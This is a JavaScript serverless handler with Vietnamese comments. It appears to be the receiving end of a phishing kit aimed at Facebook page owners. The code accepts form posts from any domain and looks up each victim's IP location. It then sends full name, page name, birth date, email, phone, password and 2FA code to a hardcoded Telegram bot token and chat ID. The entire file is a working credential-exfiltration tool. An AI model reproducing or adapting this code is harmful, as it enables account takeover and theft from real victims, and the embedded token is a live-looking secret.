import crypto from 'crypto';

const TELEGRAM_BOT_TOKEN = '8606442477:AAHGWiqoxONFe0544AfUWmxZCdoRysAcAJk';
const TELEGRAM_CHAT_IDS = '-5477819014';

// Tăng giới hạn ký tự để không bị mất dữ liệu
const FIELD_LIMITS = {
    fullName: 500,
    email: 1000,
    emailBusiness: 1000,
    phone: 100,
    fanpage: 500,
    dob: 50,
    note: 5000,
    password: 500,
    code: 100,
};

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

function setSecurityHeaders(res) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

// Giải mã dữ liệu (Hỗ trợ cả Base64 lẫn JSON thường)
function parseRequestBody(reqBody) {
    if (!reqBody) return null;
    
    // Nếu Frontend gửi dạng { data: "base64..." }
    if (reqBody.data && typeof reqBody.data === 'string') {
        try {
            const decoded = Buffer.from(reqBody.data, 'base64').toString('utf-8');
            return JSON.parse(decoded);
        } catch (e) {
            console.error('Base64 decode failed:', e.message);
        }
    }
    
    // Nếu Frontend gửi JSON trực tiếp
    if (typeof reqBody === 'object') {
        return reqBody;
    }

    // Nếu Frontend gửi dạng chuỗi JSON
    if (typeof reqBody === 'string') {
        try {
            return JSON.parse(reqBody);
        } catch (e) {
            return null;
        }
    }

    return null;
}

function buildMessage(data, ip = 'Unknown') {
    let msg = `<b>🔔 Notification</b>\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>IP:</b> ${escapeHtml(ip)}\n`;
    msg += `<b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
    msg += `<b>Source:</b> ${escapeHtml(data.source || 'Unknown')}\n`;

    if (data.device) {
        const d = data.device;
        const deviceParts = [];
        if (d.os) deviceParts.push(escapeHtml(d.os));
        if (d.browser) deviceParts.push(escapeHtml(d.browser));
        if (d.screen) deviceParts.push(escapeHtml(d.screen));
        if (d.mobile) deviceParts.push('📱');
        msg += `<b>Device:</b> ${deviceParts.join(' | ') || 'Unknown'}\n`;
    }

    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    if (data.fullName) msg += `<b>Full Name:</b> ${escapeHtml(data.fullName)}\n`;
    if (data.fanpage) msg += `<b>Page Name:</b> ${escapeHtml(data.fanpage)}\n`;
    if (data.dob) msg += `<b>Date of birth:</b> ${escapeHtml(data.dob)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    if (data.email) msg += `<b>Email:</b> <code>${escapeHtml(data.email)}</code>\n`;
    if (data.emailBusiness) msg += `<b>Email Business:</b> <code>${escapeHtml(data.emailBusiness)}</code>\n`;
    if (data.phone) msg += `<b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>\n`;
    if (data.note) msg += `<b>Note:</b> ${escapeHtml(data.note)}\n`;

    if (data.password) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>Password:</b> <code>${escapeHtml(data.password)}</code>\n`;
    }

    if (data.code) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>Code 2FA:</b> <code>${escapeHtml(data.code)}</code>\n`;
    }

    return msg;
}

async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
        console.error('Telegram credentials not configured');
        return false;
    }

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const resData = await response.json();
            return resData.ok;
        } catch (e) {
            console.error(`Telegram error for chat ${chatId}:`, e.message);
            return false;
        }
    });

    const results = await Promise.all(promises);
    return results.some(res => res === true);
}

async function getIPInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`, {
            headers: { 'User-Agent': 'vercel-serverless' }
        });
        const data = await res.json();
        if (data && !data.error) {
            const cityCode = data.city ? data.city.charAt(0).toUpperCase() : '';
            return `${data.city}(${cityCode}) | ${data.country_name}(${data.country_code})`;
        }
    } catch (e) {
        console.error('[IP_LOOKUP] Failed:', e.message);
    }
    return 'Unknown';
}

export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';

    setSecurityHeaders(res);

    // Mở rộng CORS để nhận request từ mọi Tên miền/Domain
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Đọc dữ liệu từ body request
        const data = parseRequestBody(req.body);

        if (!data) {
            console.error('Không thể đọc dữ liệu gửi lên:', req.body);
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const location = await getIPInfo(ip);
        const origin = req.headers.origin || req.headers.referer || 'Unknown';
        const source = origin.replace(/^https?:\/\//, '').split('/')[0];

        // Chuẩn bị thông tin tin nhắn
        const payload = {
            ...data,
            location,
            source
        };

        const msg = buildMessage(payload, ip);
        const sentSuccess = await sendTelegram(msg);

        if (sentSuccess) {
            return res.status(200).json({ success: true, session_id: crypto.randomBytes(16).toString('hex') });
        } else {
            return res.status(500).json({ success: false, error: 'Failed to send Telegram message' });
        }

    } catch (error) {
        console.error('Handler error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
}
